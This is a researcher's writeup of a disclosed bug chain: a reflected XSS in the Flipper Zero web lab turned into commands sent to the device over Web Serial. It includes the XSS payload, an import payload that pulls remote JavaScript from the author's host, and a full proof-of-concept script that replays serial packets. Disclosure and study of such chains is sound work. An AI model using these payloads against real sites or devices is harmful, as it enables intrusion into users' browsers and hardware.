# XSS 2 RCE on Flipper Zero
1670465161

Got RCE through an XSS on lab.flipper.net, here's the writeup

[PoC Video, printing 1337 on the screen](https://lude.rs/h4ck1ng/img/flipper_rce_poc.mp4)

Was installing the unleashed firmware on my flipper and notice that the "channel" parameter was being reflected on the dropdown. Being the nerd I am, injected an `<img/src/onerror=alert(1)>` ([https://tinyxss.terjanq.me/](https://tinyxss.terjanq.me/)) tag and boom XSS

![xss alert](https://lude.rs/h4ck1ng/img/veMxVtC.jpg)

The vulnerability occurs because of the "v-html" directive of Vue.js on the page 
`<q-item-label v-html="scope.opt.label" />`

[https://vuejs.org/api/built-in-directives.html#v-html](https://vuejs.org/api/built-in-directives.html#v-html)


alert() is boring, let's get RCE! The website is used to interface with your Flipper Zero  install new apps, update the firmware, etc.  This is done using the [Web Serial API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Serial_API), an experimental API to read/write serial devices, what could go wrong? 

The website has to ask the user for permission to connect, like for the webcam, but we can assume that the user already accepted because the XSS won't show if the flipper isn't connected. So I went to read how the serial communication is done on [https://github.com/flipperdevices/lab.flipper.net](https://github.com/flipperdevices/lab.flipper.net)

Looks like if we can execute `screenFrame(data)` the application will send a command to flipper display on the screen, which is enough for the PoC. The problem was that everything was wrapped with [Webpack](https://webpack.js.org/). Spent a lot of time debugging trying to find globally accessible objects and oh boi was impossible (accepting tips). Having gave up to use the app's own code, I had to made my payload to directly communicate via serial with flipper.
So I just open a `navigator.serial.getPorts()` and communicate with it, right? Wrong, the port is already being used and I can't get the reference of it because of [Webpack](https://webpack.js.org/). My workaround was to disconnect it and connect again, doing a `.click()` on the disconnect button (fuck webpack) Now we just need to send the right data to the flipper aaaaaaand ... the protocol is undocumented, nice. It uses [ProtoBuf](https://developers.google.com/protocol-buffers) which is not that hard to understand but what an overkill of a protocol does flipper have gosh (actually amazing). [https://github.com/flipperdevices/flipperzero-protobuf](https://github.com/flipperdevices/flipperzero-protobuf) 

To simplify the PoC I just did all the steps on the application itself and `console.log()` the shit out of it, had to use [HTTP Mock](https://portswigger.net/bappstore/42680f96fc214513bc5211b3f25fd98b) to change the js to properly get all the "packets" since it was too fast. Also had to manually edit the 3rd byte of every packet on the final payload, because it's incremental (guessing powers), btw every connection begins with `start_rpc_session\r`. Not sure what every byte is, but the biggest byte array is a bmp representation of the `1337` on screen. Then just replayed the data to the serial.

[https://github.com/caioluders/pocs/blob/main/flipper_rce_xss.js](https://github.com/caioluders/pocs/blob/main/flipper_rce_xss.js)

```javascript

// payload : <img/src/onerror=import('https://lude.rs/pocs/flipper_rce_xss.js')>

const sleep = ms => new Promise(r => setTimeout(r, ms));


setTimeout( async() => {

	// disconnect current serial ;
	document.querySelector("#q-app > div > header > div > button").click();

	await sleep(100);

	try {
		document.querySelector("body > div:nth-child(3) > div > div > div.column.items-center > button").click();
	} catch {
		document.querySelector("body > div:nth-child(4) > div > div > div.column.items-center > button").click();
	}

	await sleep(500);

	var ports = await navigator.serial.getPorts();
	var pwn = await ports[0].open({baudRate:1});
	var payload = [
		new Uint8Array([115,116,97,114,116,95,114,112,99,95,115,101,115,115,105,111,110,13]).buffer, // start_rpc_session\r
		new Uint8Array([4,8,1,42,0]).buffer,
		new Uint8Array([5,8,2,130,2,0]).buffer,
		new Uint8Array([10, 8, 3, 58, 6, 10, 4, 47, 101, 120, 116]).buffer,
		new Uint8Array([11, 8, 4, 226, 1, 6, 10, 4, 47, 101, 120, 116]).buffer,
		new Uint8Array([5,8,5,210,1,0]).buffer,
		new Uint8Array([9,8,6,186,1,4,8,4,16,0]).buffer,
		new Uint8Array([9,8,7,186,1,4,8,4,16,2]).buffer,
		new Uint8Array([9,8,8,186,1,4,8,4,16,1]).buffer,
		new Uint8Array([137,8,8,9,178,1,131,8,10,128,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,48,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,136,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,140,0,0,0,0,0,0,0,248,255,255,0,0,0,0,0,132,0,0,0,0,0,0,0,0,0,128,7,0,0,0,0,196,0,252,31,0,0,0,0,0,0,0,8,0,0,0,0,68,0,0,96,0,0,0,0,0,0,0,16,0,0,0,0,70,0,0,64,0,224,255,3,0,0,0,96,0,0,0,0,66,0,0,128,0,0,0,4,0,0,0,64,0,0,0,0,66,0,0,0,1,0,0,4,0,0,0,64,0,0,0,0,66,0,0,0,1,0,0,4,0,0,0,64,0,0,0,0,66,0,0,0,1,0,0,4,0,0,0,64,0,0,0,0,66,0,0,0,1,0,0,4,0,0,0,64,0,0,0,0,66,0,0,0,1,0,0,2,0,0,0,64,0,0,0,0,64,0,0,192,0,0,224,7,0,0,0,64,0,0,0,0,64,0,0,255,1,0,56,8,0,0,0,64,0,0,0,0,64,0,0,0,2,0,0,16,0,0,0,64,0,0,0,0,64,0,0,0,2,0,0,16,0,0,0,64,0,0,0,0,64,0,0,0,4,0,0,16,0,0,0,32,0,0,0,0,64,0,0,0,8,0,0,32,0,0,0,32,0,0,0,0,64,0,0,0,8,0,0,32,0,0,0,32,0,0,0,0,64,0,0,0,8,0,0,32,0,0,240,255,255,3,0,0,32,0,0,0,8,0,0,16,0,0,0,32,0,0,0,0,32,0,0,0,8,0,1,12,0,0,0,48,0,0,0,0,32,0,0,0,4,0,1,6,0,0,0,16,0,0,0,0,32,0,0,2,3,0,227,1,0,0,0,16,0,0,0,0,32,0,0,254,1,0,60,0,0,0,0,16,0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,32,4,0,0,0,0,0,0,0,0,0,16,0,0,0,0,248,7,0,0,0,0,0,0,0,0,0,16,0,0,0,128,63,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,24,0,0,0,0,32,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]).buffer,
		new Uint8Array([9,8,10,186,1,4,8,4,16,0]).buffer,
		new Uint8Array([9,8,11,186,1,4,8,4,16,2]).buffer,
		new Uint8Array([9,8,12,186,1,4,8,4,16,1]).buffer
	];

	for (var i = 0; i < payload.length; i++) {
		await sleep(100);

		var writer = await ports[0].writable.getWriter() ; 
		await writer.write(payload[i]);
		await writer.close();
	}
	


	console.log('done');

},500);
```

What a wonderful era we live in, where XSS can get you RCE on an embedded device (ಥ﹏ಥ)

Shout out to hunter.dev for dealing with the disclosure process. [https://huntr.dev/bounties/03ce4392-c715-4127-af9b-e647d64fdd38/](https://huntr.dev/bounties/03ce4392-c715-4127-af9b-e647d64fdd38/)

